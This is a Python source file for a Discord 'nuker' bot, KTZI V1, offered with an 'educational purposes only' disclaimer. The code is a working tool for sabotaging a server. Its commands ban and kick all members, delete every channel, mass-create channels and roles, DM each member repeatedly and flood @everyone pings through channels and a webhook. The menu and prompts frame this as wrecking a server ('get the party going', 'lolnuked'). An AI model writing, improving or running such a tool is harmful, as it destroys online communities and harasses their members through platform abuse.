import discord
import asyncio
import random
from discord.ext import commands
'''
This bot is made solely for educational purposes. I do not take any responsibly for what happens to the user, bot or the server this code is used executed in. 

All code made using or based off this code is not endorsed. 

I do not endorse, support or encourage API abuse. 

- ADV // Fres#2005
'''

intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix='', intents=intents)
print("""
██╗░░██╗████████╗███████╗██╗░░░  ██╗░░░██╗░░███╗░░
██║░██╔╝╚══██╔══╝╚════██║██║░░░  ██║░░░██║░████║░░
█████═╝░░░░██║░░░░░███╔═╝██║░░░  ╚██╗░██╔╝██╔██║░░
██╔═██╗░░░░██║░░░██╔══╝░░██║░░░  ░╚████╔╝░╚═╝██║░░
██║░╚██╗░░░██║░░░███████╗██║██╗  ░░╚██╔╝░░███████╗
╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚═╝  ░░░╚═╝░░░╚══════╝""")
print("Thank you for using KTZI V1 (STABLE.)")
print("========================")

print("""Commands (type them in chat) 

banall - bans everyone
kickall - kicks everyone
byechannel - deletes all channels
makechannel - makes multiple channels (CHECK TERMINAL.)
makeroles - spam-makes roles.
ping - pings everyone in random channel
dm - dms every user 100 times
spam - creates a webhook and spams everyone

""")
channel_make = int(input("(R)How many times do you want to create a channel? - "))
channel_name = str(input('(R)What would you like to name the channel? (no spaces) - \n'))
print("========================")
tk = str(input("Lastly, please put your bot token - "))
print("========================")
@client.event
async def on_ready():
	print("KTZI V1 is now online!")
	print("========================\n")
	print("Start with 'byechannel' to get the party going...")
  


@client.command(pass_context=True)
async def banall(ctx): 
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Members GONE, Members banned - {num} users")

@client.command(pass_context=True)
async def kickall(ctx):
    await ctx.message.delete()
    num = 0
    for member in ctx.guild.members:
        try:
            await member.kick()
            print(f"[+] Kicked {member}")
            num += 1
        except:
            print(f"[-] Could not kick {member}")
    print(f"\n[+] Members GONE, Members banned - {num} users")

@client.command()
async def byechannel(ctx):
    for c in ctx.guild.channels: # iterating through each guild channel
        await c.delete()
        print("Deleted channels - ",c)

@client.command()
async def makechannel(ctx):
  x = 0
  guild = ctx.message.guild

  while x<channel_make:
    await guild.create_text_channel(channel_name)
    x=x+1
    print("Channel Created - ",x)
'''
@client.command()
async def servernamechange(ctx):
  #server_name = str(print("What would you like the new server name to be?"))
  server_name = 'lolnuked'
  await ctx.guild.edit(server_name)
'''


eme = discord.Embed(
  title = 'Well hello there',
  description = 'Shalom, fellow user. You have been dmed to leave this server you have recieved this DM from! its super crap'
)

@client.command()
async def dm(ctx):
    guild = ctx.message.guild
    for member in guild.members:
        await asyncio.sleep(0)
        try:
            x = 0
            while x<10:
              await member.send(embed=eme)
              x = x + 1
            #await ctx.send("Sent message")
        except:
             await ctx.send("dms off lmao")
    
@client.command()
async def ping(ctx):
  for c in ctx.guild.channels:
    n=0
    while n<100:
      await random.choice(ctx.guild.channels).send("@everyone")

      n = n+1
      print("Sent @everyone",n,"times.")

@client.command()
async def spam(ctx):
    leng = 1000
    msg = '@everyone'
    #tim = 100
    # Checking if a webhook exists already
    webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
    if webhook is None:
        # If the webhook didn't exist, we create one
        webhook = await ctx.channel.create_webhook(name='Spammer')
    else:
        for i in range(leng) :
            await webhook.send(content=msg, username=ctx.author.display_name, avatar_url=ctx.author.avatar_url)
            #await asyncio.sleep(tim)
            print(i)

'''

@client.command()
async def byeroles(ctx):

    guild = ctx.guild

    for role in guild.roles:
      await role.delete()
'''

@client.command()
async def makeroles(ctx):
  x = 0
  while x < 100:
    guild = ctx.guild
    await guild.create_role(name="role name")     
    x += 1 


client.run(tk)